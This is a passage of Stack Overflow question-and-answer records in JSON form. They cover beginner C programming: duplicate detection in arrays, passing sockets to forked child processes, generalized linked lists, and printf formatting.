"https://lh5.googleusercontent.com/-ffWFm9uJgO4/AAAAAAAAAAI/AAAAAAAABjI/hXd8V3yjdoE/photo.jpg?sz=128", "display_name": "Harshith Rai", "link": "https://stackoverflow.com/users/10232790/harshith-rai"}, "is_accepted": true, "score": 1, "last_activity_date": 1542193009, "last_edit_date": 1542193009, "creation_date": 1542192587, "answer_id": 53298430, "question_id": 53297231, "link": "https://stackoverflow.com/questions/53297231/finding-duplicate-values-in-array-in-c/53298430#53298430", "title": "Finding duplicate values in array in c", "body": "<p>The problem at hand is essentially simple. There is no need for any complicated code fragments. All it takes is just a little modification to the limits of the <code>for</code> loops and how you check for duplicates.</p>\n\n<p><strong>The solution:</strong></p>\n\n<p>Just introduce another array which is going to store the elements which are repeated in the array. Start filling this array from the 0th index as and when you find a NEWLY REPEATED element. This can easily be done iterating through this new array and checking if the currently encountered repeated element is already present or not. If it is not present there, then insert into the new array, which in the code I have given below is <code>arr2[]</code>. </p>\n\n<p>Hence whatever elements will be held by this new array are the unique repeated elements. I have attached the code and corresponding output below.</p>\n\n<p><strong>CODE:</strong></p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n    int numbers[15] = {1,1,2,2,2,3,4,5,6,6,7,7,7,8,9}, i, j;\n    int arr2[15], k = 0, k1 = 0;\n    int flag = 0;\n    for(i = 0; i &lt; 15; i++)\n    {\n       for(j = 0; j &lt; 15; j++)\n       {\n           flag = 0;\n           if(i != j &amp;&amp; numbers[i] == numbers[j])\n           {\n               for(k1 = 0; k1 &lt; k; k1++)\n                   if(arr2[k1] == numbers[j])\n                     flag = 1;\n               if(flag != 1)\n                   arr2[k++] = numbers[j];\n           }\n       }\n    }\n    for(i = 0; i &lt; k; i++)\n      printf(\"Number %d has duplicate values\\n\",arr2[i]);\n    return 0;\n}\n</code></pre>\n\n<p><strong>OUTPUT:</strong></p>\n\n<blockquote>\n<pre><code>Number 1 has duplicate values\nNumber 2 has duplicate values\nNumber 6 has duplicate values\nNumber 7 has duplicate values\n</code></pre>\n</blockquote>\n\n<p>Hope this helps.</p>\n"}], "owner": {"reputation": 43, "user_id": 8664903, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/1503520916403383/picture?type=large", "display_name": "Jayaraj Rohan", "link": "https://stackoverflow.com/users/8664903/jayaraj-rohan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6400, "favorite_count": 0, "accepted_answer_id": 53298430, "answer_count": 4, "score": 1, "last_activity_date": 1542232586, "creation_date": 1542188957, "last_edit_date": 1542232586, "question_id": 53297231, "link": "https://stackoverflow.com/questions/53297231/finding-duplicate-values-in-array-in-c", "title": "Finding duplicate values in array in c", "body": "<p>I am trying to find the duplicate values in an array. When a number is duplicated once like <code>(25,25)</code> program correctly prints 25 once but when a number duplicated twice like <code>(12,12,12)</code> program prints 12 three times while it should print it once.</p>\n\n<pre><code> #include&lt;stdio.h&gt;\n int main()\n{\n    int numbers[15]={1,1,2,2,2,3,4,5,6,6,7,7,7,8,9},i,j;\n    for(i=0;i&lt;15;i++)\n    {\n        for(j=i;j&lt;14;j++)\n        {\n            if(numbers[i]==numbers[j+1])\n            {\n                printf(\"Number %d has duplicate values\\n\",numbers[i]);\n            }\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Number 1 has duplicate values\nNumber 2 has duplicate values\nNumber 2 has duplicate values\nNumber 2 has duplicate values\nNumber 6 has duplicate values\nNumber 7 has duplicate values\nNumber 7 has duplicate values\nNumber 7 has duplicate values\n</code></pre>\n\n<p>The arrays cannot be assumed to be ordered so the program should work even with <code>{1,2,1,2,3,4,2,5,6,6,7,7,7,8,9}</code>.</p>\n"}, {"tags": ["c", "sockets", "networking", "multiprocessing"], "comments": [{"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1542189008, "post_id": 53297157, "comment_id": 93475377, "body": "Yeah, that&#39;s fine. It used to be common for a server process to listen on a port, accept a connection, and fork off a child to handle just that connection, for example, and you still see it sometimes."}, {"owner": {"reputation": 16402, "user_id": 4025095, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/blJ4L.jpg?s=128&g=1", "display_name": "Myst", "link": "https://stackoverflow.com/users/4025095/myst"}, "edited": false, "score": 0, "creation_date": 1544506669, "post_id": 53297157, "comment_id": 94289714, "body": "Although a forking server was not uncommon a while back... there&#39;s a reason why the approach was retired and why evented servers and hybrid servers (with a pool of worker processes and threads) is preferred. A forking server is more expensive in terms of resources per client and will likely fail to support a large number of concurrent connections."}], "answers": [{"tags": [], "owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "is_accepted": true, "score": 1, "last_activity_date": 1542189742, "last_edit_date": 1592644375, "creation_date": 1542189742, "answer_id": 53297508, "question_id": 53297157, "link": "https://stackoverflow.com/questions/53297157/can-socket-file-descriptors-be-passed-to-childprocesses/53297508#53297508", "title": "Can socket file descriptors be passed to childprocesses?", "body": "<p>From <a href=\"http://man7.org/linux/man-pages/man2/accept.2.html\" rel=\"nofollow noreferrer\">man accept</a> emphasis mine:</p>\n<blockquote>\n<p>RETURN VALUE</p>\n<p>On success, these system calls return a nonnegative integer that is a\n<strong>file descriptor</strong> for the accepted socket.</p>\n</blockquote>\n<p>From <a href=\"https://linux.die.net/man/2/fork\" rel=\"nofollow noreferrer\">man fork</a> emphasis mine:</p>\n<blockquote>\n<ul>\n<li>The child inherits <strong>copies</strong> of the parent's set of <strong>open file descriptors</strong>. Each file descriptor in the child refers to the same open file description (see open(2)) as the corresponding file descriptor in the parent. This means that the two descriptors share open file status flags, current file offset, and signal-driven I/O attributes (see the description of F_SETOWN and F_SETSIG in fcntl(2)).</li>\n</ul>\n</blockquote>\n<p>Every accepted connection open in parent/server will be exactly the same in child. It would be strange if your child cannot write to it.</p>\n<p>Usually server looks like this:</p>\n<pre><code>while (..) {\n     int newconnection = accept(..);\n     switch (fork()) {\n     case 0:\n         child_handle_connection(newconnection);\n         break;\n     ...\n     }\n     close(newconnection);\n     ....\n }\n</code></pre>\n<p>Comparison: first result I got from google on 'example http server C' results in <a href=\"https://gist.github.com/laobubu/d6d0e9beb934b60b2e552c2d03e1409e#file-httpd-c-L54\" rel=\"nofollow noreferrer\">this source file</a>.</p>\n"}], "owner": {"reputation": 83, "user_id": 9805957, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-oVy71mYZTmM/AAAAAAAAAAI/AAAAAAAAAEs/UCcnNmZiUPg/photo.jpg?sz=128", "display_name": "Leslie", "link": "https://stackoverflow.com/users/9805957/leslie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "accepted_answer_id": 53297508, "answer_count": 1, "score": 0, "last_activity_date": 1542189742, "creation_date": 1542188755, "question_id": 53297157, "link": "https://stackoverflow.com/questions/53297157/can-socket-file-descriptors-be-passed-to-childprocesses", "title": "Can socket file descriptors be passed to childprocesses?", "body": "<p>I'm currently writing a program and it's a multiprocessed server application. My current idea is for each incoming TCP connection I accept it and pass the incoming socet descriptor to a child process created with fork(). Is the socket descriptor the same in both processes or can undefined behaivour occur? It seems like I can read from the incoming socket but not write to it.</p>\n"}, {"tags": ["c", "eclipse", "git", "hash"], "answers": [{"tags": [], "owner": {"reputation": 154, "user_id": 4623899, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh5.googleusercontent.com/-ovtp7HNSjt4/AAAAAAAAAAI/AAAAAAAAADs/lSsa8_XxJGU/photo.jpg?sz=128", "display_name": "EffegiWeb", "link": "https://stackoverflow.com/users/4623899/effegiweb"}, "is_accepted": false, "score": 0, "last_activity_date": 1542465170, "creation_date": 1542465170, "answer_id": 53352187, "question_id": 53296971, "link": "https://stackoverflow.com/questions/53296971/use-the-git-hash-code-in-eclipse-cdt-build-process/53352187#53352187", "title": "Use the git hash code in Eclipse CDT build process", "body": "<p>The only solution that I find for the moment is write a eclipse plugin.\nWorking in progress...</p>\n"}], "owner": {"reputation": 154, "user_id": 4623899, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh5.googleusercontent.com/-ovtp7HNSjt4/AAAAAAAAAAI/AAAAAAAAADs/lSsa8_XxJGU/photo.jpg?sz=128", "display_name": "EffegiWeb", "link": "https://stackoverflow.com/users/4623899/effegiweb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 95, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1542465170, "creation_date": 1542188117, "last_edit_date": 1542465108, "question_id": 53296971, "link": "https://stackoverflow.com/questions/53296971/use-the-git-hash-code-in-eclipse-cdt-build-process", "title": "Use the git hash code in Eclipse CDT build process", "body": "<p>We need to pass the short git hash code <code>git rev-parse --short HEAD</code>, to the eclipse build process.\nwe use the Eclipse CDT internal builder.\nI tried to store the git hash in a environment variable, using a pre-build script.\nBut in the build the variable is empty.\nOur development system is based on windows eclipse CDT with a cross c compiler.\nHow can this be achieved?</p>\n"}, {"tags": ["c", "data-structures", "linked-list"], "comments": [{"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542188372, "post_id": 53296946, "comment_id": 93474963, "body": "There is no <code>struct gll</code> defined anywhere in the code you provided. Please, show a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1542188395, "post_id": 53296946, "comment_id": 93474975, "body": "<code>struct gll* next;</code> - you have not defined a struct by <i>this</i> name."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1542188434, "post_id": 53296946, "comment_id": 93475000, "body": "If you got a compiler error / diagnostics message you must paste it as text into the question as well."}, {"owner": {"reputation": 11, "user_id": 10650959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98481bc08fee8ab1493e222739938541?s=128&d=identicon&r=PG&f=1", "display_name": "Paras Karnawat", "link": "https://stackoverflow.com/users/10650959/paras-karnawat"}, "edited": false, "score": 0, "creation_date": 1542188530, "post_id": 53296946, "comment_id": 93475069, "body": "I have added the struct gll and there is no compile error or diagnostics message."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1542188741, "post_id": 53296946, "comment_id": 93475211, "body": "Ok... you need a stack here, to store the <i>past parents</i>, whenever you see <code>(</code> you push / recurse, whenever <code>)</code> you pop / return."}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542188896, "post_id": 53296946, "comment_id": 93475306, "body": "<code>createNode()</code> is also missing."}, {"owner": {"reputation": 11, "user_id": 10650959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98481bc08fee8ab1493e222739938541?s=128&d=identicon&r=PG&f=1", "display_name": "Paras Karnawat", "link": "https://stackoverflow.com/users/10650959/paras-karnawat"}, "edited": false, "score": 0, "creation_date": 1542189026, "post_id": 53296946, "comment_id": 93475385, "body": "It is stuck in an infinite loop when I recurse wherever the program sees &#39;(&#39;"}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542191053, "post_id": 53296946, "comment_id": 93476657, "body": "what is <code>flags</code> supposed to be?"}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542191319, "post_id": 53296946, "comment_id": 93476828, "body": "+ you cannot use <code>generateList()</code> recursively in its current form because when it returns you have no idea of how many characters it consumed."}, {"owner": {"reputation": 11, "user_id": 10650959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98481bc08fee8ab1493e222739938541?s=128&d=identicon&r=PG&f=1", "display_name": "Paras Karnawat", "link": "https://stackoverflow.com/users/10650959/paras-karnawat"}, "edited": false, "score": 0, "creation_date": 1542193513, "post_id": 53296946, "comment_id": 93478160, "body": "How do I do it then? Also, if flag is true then it means that the data is not to be considered but there is a child list to be linked."}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "is_accepted": false, "score": 0, "last_activity_date": 1542195720, "creation_date": 1542195720, "answer_id": 53299433, "question_id": 53296946, "link": "https://stackoverflow.com/questions/53296946/generalized-linked-list-adding-child-link-whenever-an-opening-bracket-occurs/53299433#53299433", "title": "Generalized Linked List: Adding Child Link whenever an opening bracket occurs", "body": "<blockquote>\n  <p>How do I do it then?</p>\n</blockquote>\n\n<p>You could do something like that:</p>\n\n<pre><code>#include &lt;stdbool.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct gll\n{\n    int tag;\n    struct gll* next;\n    char data;\n    struct gll* dlink;\n} GLL;\n\nGLL* createNode(char value, int flag)\n{\n    GLL* newNode = calloc(1, sizeof(*newNode));\n\n    if (!newNode)\n        return NULL;\n\n    newNode-&gt;tag = flag;\n    newNode-&gt;data = value;\n    return newNode;\n}\n\nvoid freeList(GLL *list)\n{\n    for (GLL *current_node = list, *temp; current_node; current_node = temp) {\n        temp = current_node-&gt;next;\n        freeList(current_node-&gt;dlink);\n        free(current_node);\n    }\n}\n\nGLL* generateList(char *poly, size_t *pos)\n{\n    size_t const length = strlen(poly);\n    GLL *head = NULL;\n    GLL *tail = NULL;\n\n    for (; *pos &lt; length; ++*pos) {\n        if (poly[*pos] == '(') {\n            ++*pos;  // don't have the next called generateList() read '(' again\n            tail-&gt;dlink = generateList(poly, pos);\n            if (!tail-&gt;dlink) {\n                freeList(head);\n                return NULL;\n            }\n            continue;\n        }\n        else if (poly[*pos] == ')') {\n            return head;\n        }\n        else if (isalpha((char unsigned)poly[*pos])) {\n            if (!head) {\n                head = tail = createNode(poly[*pos], 0);\n            }\n            else {\n                tail-&gt;next = createNode(poly[*pos], 0);\n                tail = tail-&gt;next;\n            }\n            continue;\n        }\n        else if (poly[*pos] == ',')\n            continue;\n\n        fputs(\"Format error :(\\n\\n\", stderr);\n        freeList(head);\n        return NULL;\n    }\n\n    return head;\n}\n\nvoid printList(GLL *list)\n{\n    for (GLL *node = list; node; node = node-&gt;next) {\n        printf(\"%c \", node-&gt;data);\n        if (node-&gt;dlink) {\n            putchar('(');\n            printList(node-&gt;dlink);\n            printf(\"\\b) \");\n        }\n    }\n}\n\nint main(void)\n{\n    size_t pos = 0;\n    GLL *list = generateList(\"a,(b,(c,d,e(f)),g,h),i,j,k\", &amp;pos);\n\n    printList(list);\n    putchar('\\n');\n\n    freeList(list);\n}\n</code></pre>\n\n<h3>Output</h3>\n\n<p>a (b (c d e (f)) g h) i j k</p>\n\n<blockquote>\n  <p>Also, if flag is true then it means that the data is not to be considered but there is a child list to be linked.</p>\n</blockquote>\n\n<p>Sorry, but I don't get how there could be a child list if there is no data for the node.</p>\n"}], "owner": {"reputation": 11, "user_id": 10650959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98481bc08fee8ab1493e222739938541?s=128&d=identicon&r=PG&f=1", "display_name": "Paras Karnawat", "link": "https://stackoverflow.com/users/10650959/paras-karnawat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 168, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1542195720, "creation_date": 1542188051, "last_edit_date": 1542189197, "question_id": 53296946, "link": "https://stackoverflow.com/questions/53296946/generalized-linked-list-adding-child-link-whenever-an-opening-bracket-occurs", "title": "Generalized Linked List: Adding Child Link whenever an opening bracket occurs", "body": "<p>Here is my code for generating a GLL for the string input: a,(b,c),d where (b,c) will be linked as a child at the next link of a.</p>\n\n<pre><code>GLL* generateList(char poly[])\n{\n    GLL* newNode = NULL, *first = NULL, *ptr = NULL;\n\n    while (poly[i] != '\\0')\n    {\n        if (poly[i] == ')')\n        {\n            return first;\n        }\n        else\n        {\n            if (poly[i] != ',')\n            {\n                if (poly[i] != '(')\n                {\n                    newNode = createNode(poly[i], 0);\n                }\n                else\n                {\n                    ++i;\n                    newNode = createNode('#', 1);\n                    newNode-&gt;dlink = generateList(poly);\n                }\n            }\n        }\n\n        if (first != NULL)\n        {\n            ptr = first;\n            while (ptr-&gt;next != NULL)\n            {\n                ptr = ptr-&gt;next;\n            }\n            ptr-&gt;next = newNode;\n        }\n        else\n        {\n            first = newNode;\n        }\n        i++;\n    }\n    return first;\n}\n</code></pre>\n\n<p>And here is the structure I used for each node.</p>\n\n<pre><code>    typedef struct gll\n    {\n       int tag;\n       struct gll* next;\n       char data;\n       struct gll* dlink;\n    } GLL;\n</code></pre>\n\n<p>I am not finding a way to add that child link to the parent link whenever the bracket opens. The programs runs in a loop.</p>\n\n<p>Note: I have declared i=0 as a global variable to hold the position of character.</p>\n\n<p>Edit: Here is the createNode function</p>\n\n<pre><code>GLL* createNode(char value, int flag)\n{\n GLL* newNode;\n\n newNode = (GLL *) malloc(sizeof(GLL)*1);\n\n newNode-&gt;data = value;\n newNode-&gt;dlink = NULL;\n\n newNode-&gt;tag = flag;\n newNode-&gt;next = NULL;\n\nreturn newNode;\n}\n</code></pre>\n"}, {"tags": ["c", "struct", "linked-list"], "comments": [{"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1542187452, "post_id": 53296710, "comment_id": 93474399, "body": "Did you mean to print <code>a-&gt;info</code> (which is an <code>int</code> and can be printed with <code>%d</code>) instead of <code>a-&gt;link</code>?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1542187471, "post_id": 53296710, "comment_id": 93474407, "body": "It would appear that &#39;%d&#39; expects argument of type &#39;int&#39;, but argument 2 has type &#39;struct Node *&#39;. Shouldn&#39;t you rather print the <code>info</code> member than the pointer to next node?"}, {"owner": {"reputation": 188064, "user_id": 635608, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oIJia.png?s=128&g=1", "display_name": "Mat", "link": "https://stackoverflow.com/users/635608/mat"}, "edited": false, "score": 0, "creation_date": 1542187491, "post_id": 53296710, "comment_id": 93474421, "body": "Indent your code properly, the last problem should be very clear."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1542187534, "post_id": 53296710, "comment_id": 93474459, "body": "implicit declaration of function &#39;print&#39; means that 1) you forgot stdio.h and 2) you are using gcc in crap mode, while you should be using it as a C compiler: <code>gcc -std=c11 -pedantic-errors</code>."}], "answers": [{"tags": [], "owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "is_accepted": false, "score": 1, "last_activity_date": 1542187821, "creation_date": 1542187821, "answer_id": 53296881, "question_id": 53296710, "link": "https://stackoverflow.com/questions/53296710/linked-list-creation-problem-at-compilation-in-this-way-of-solving-it/53296881#53296881", "title": "linked list creation problem at compilation in this way of solving it", "body": "<ol>\n<li><p>The line <code>printf(\" %d \", a-&gt;link);</code> has the type of <code>%d</code> and parameter of <code>node</code> . What you want here is to print the integer </p>\n\n<pre><code>printf(\" %d \", a-&gt;info);\n</code></pre></li>\n<li><p>You have misaligned the brackets for the <code>insert</code> function. In the original code, the definition of <code>print</code> is <em>inside</em> the definition of <code>insert</code>. You need to close the bracket for <code>insert</code> function properly and the call for <code>print(head);</code> will receive the proper definition. and work correctly.</p></li>\n<li><p>You are using <code>void main()</code> The correct format for main without any command line parameters is <code>int main(void)</code> </p></li>\n</ol>\n"}, {"comments": [{"owner": {"reputation": 1983, "user_id": 5976413, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kP7jz.jpg?s=128&g=1", "display_name": "John M", "link": "https://stackoverflow.com/users/5976413/john-m"}, "edited": false, "score": 0, "creation_date": 1542194577, "post_id": 53298974, "comment_id": 93478810, "body": "Please include some explanation in your answer instead of just posting a block of code"}], "tags": [], "owner": {"reputation": 1, "user_id": 10650839, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-vjF8YyGo6Tc/AAAAAAAAAAI/AAAAAAAAAAA/ABtNlbAedMy3mw1egvR9JyTBzmxxua3hkA/mo/photo.jpg?sz=128", "display_name": "user10650839", "link": "https://stackoverflow.com/users/10650839/user10650839"}, "is_accepted": false, "score": 0, "last_activity_date": 1542194277, "creation_date": 1542194277, "answer_id": 53298974, "question_id": 53296710, "link": "https://stackoverflow.com/questions/53296710/linked-list-creation-problem-at-compilation-in-this-way-of-solving-it/53298974#53298974", "title": "linked list creation problem at compilation in this way of solving it", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Node {\n\n    int information;\n    struct Node* next;\n};\n\nstruct Node* Create_Node (void);\nvoid Insert_Node (struct Node* target, int information);\nvoid Print_Node (struct Node* head);\n\nint main (int argc, char* argv[]) {\n\n    struct Node* head = NULL;\n    head = Create_Node();\n    head-&gt;next = NULL;\n\n    Insert_Node (head, 7);\n    Insert_Node (head, 9);\n\n    printf (\"\\nCreate Linked list is : \");\n    Print_Node (head);\n\n    // free head\n    if (head != NULL) head = NULL;\n    free (head);\n\n    return 0;\n}\n\nvoid Print_Node (struct Node* head) {\n\n    struct Node* current = NULL;\n    current = head-&gt;next;\n\n    while (current != NULL) {\n\n        printf (\"%3d \", current-&gt;information);\n        current = current-&gt;next;\n    }\n    printf (\"\\n\");\n\n\n    // free current\n    while (current != NULL) {\n\n        struct Node* next = current-&gt;next;\n        if (current != NULL) current = NULL;\n        free (current);\n        current = next;\n    }\n\n    return;\n}\n\nvoid Insert_Node (struct Node* target, int _information) {\n\n    struct Node* New_Node = NULL;\n    New_Node = Create_Node();\n    New_Node-&gt;next = target-&gt;next;\n\n    // data\n    New_Node-&gt;information = _information;\n\n    target-&gt;next = New_Node;\n\n    return;\n}\n\nstruct Node* Create_Node (void) {\n\n    struct Node* Pointer_Return = NULL;\n    Pointer_Return = (struct Node*) calloc (1, sizeof (struct Node));\n\n    if (Pointer_Return == NULL) {\n\n        printf (\"Error! Dynamic memory allocation, Create_Node()\\n\");\n        return NULL;\n    }\n    return Pointer_Return;\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10650710, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-e9sx7SsEkYc/AAAAAAAAAAI/AAAAAAAAAAA/ABtNlbAaA9foxpy5vJIS41w-nA7iZNRf-w/mo/photo.jpg?sz=128", "display_name": "aman joshi", "link": "https://stackoverflow.com/users/10650710/aman-joshi"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 57, "favorite_count": 0, "closed_date": 1542212843, "answer_count": 2, "score": -5, "last_activity_date": 1542203160, "creation_date": 1542187306, "last_edit_date": 1542203160, "question_id": 53296710, "link": "https://stackoverflow.com/questions/53296710/linked-list-creation-problem-at-compilation-in-this-way-of-solving-it", "closed_reason": "Not suitable for this site", "title": "linked list creation problem at compilation in this way of solving it", "body": "<p><strong>help with the lines that says //PLEASE TELL ME PROBLEM IN THIS LINE</strong>        </p>\n\n<h1>include </h1>\n\n<pre><code>#include &lt;stdlib.h&gt;   \n\n// A linked list node \ntypedef struct Node \n{ \nint info; \nstruct Node *link; \n}node; \n\n//insert in a linked list\n\nvoid insert(node* head, int k)\n{\n node* temp = (node*) malloc(sizeof(node));\nif(temp==NULL)\n  {\n      printf(\"malloc was unsuccessfull\");\n      exit(0);\n  }\n  else\n  {\n      temp-&gt;info=k;\n      temp-&gt;link=NULL;\n      if(head==NULL)\n      head = temp;\n      else\n      {\n      temp-&gt;link=head;\n      head=temp;\n      }\n  }\n\n  // This function prints contents of linked list starting from head \nvoid print(node* a) \n{ \n  while (a != NULL) \n  { \n     printf(\" %d \", a-&gt;link); //PLEASE TELL ME PROBLEM IN THIS LINE\n     a = a-&gt;link; \n  } \n}\n\n}\nvoid main() \n{ \n  /* Start with the empty list */\n  node* head = NULL;\n\n  insert(head, 7);\n  insert(head, 9);\n\n  printf(\"\\n Created Linked list is: \"); \n  print(head); //PLEASE TELL ME PROBLEM IN THIS LINE\n\n}  \n</code></pre>\n\n<p><strong>Error Messages</strong></p>\n\n<pre><code>prog.c: In function 'print':\n\nprog.c:40:13: warning: format '%d' expects argument of type 'int', but argument 2 has type 'struct Node *' [-Wformat=]\n      printf(\" %d \", a-&gt;link); \n             ^\nprog.c: In function 'main':\n\nprog.c:55:3: warning: implicit declaration of function 'print' [-Wimplicit-function-declaration]\n   print(head);\n   ^\n\n\n/tmp/cc1HDBBm.o: In function `main':\n3192773816853040ef42d0aa4269a062.c:(.text+0xeb): undefined reference to `print'\ncollect2: error: ld returned 1 exit status\n</code></pre>\n"}, {"tags": ["c", "format", "printf", "number-formatting"], "comments": [{"owner": {"reputation": 849, "user_id": 4086095, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/CMn9X.jpg?s=128&g=1", "display_name": "Tsakiroglou Fotis", "link": "https://stackoverflow.com/users/4086095/tsakiroglou-fotis"}, "edited": false, "score": 0, "creation_date": 1542186436, "post_id": 53296362, "comment_id": 93473766, "body": ".00 , 1.5 and 200 doesn&#39;t share something common.Do you want the output as a string?"}, {"owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "reply_to_user": {"reputation": 849, "user_id": 4086095, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/CMn9X.jpg?s=128&g=1", "display_name": "Tsakiroglou Fotis", "link": "https://stackoverflow.com/users/4086095/tsakiroglou-fotis"}, "edited": false, "score": 0, "creation_date": 1542186523, "post_id": 53296362, "comment_id": 93473819, "body": "@TsakiroglouFotis They share that they all are 3-chars long. Yes, the output is a string :) Do I need to write the method myself? Is it out of sprintf capabilities?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1542199233, "post_id": 53296362, "comment_id": 93481459, "body": "Research <code>&quot;%3g&quot;</code> as that seems to get you close to your goal."}, {"owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542199332, "post_id": 53296362, "comment_id": 93481515, "body": "@chux As I&#39;ve written, my numbers only range from 0 to 100, I agree that critical information loss is unavoidable when trying to squish <code>-999</code> in only 3 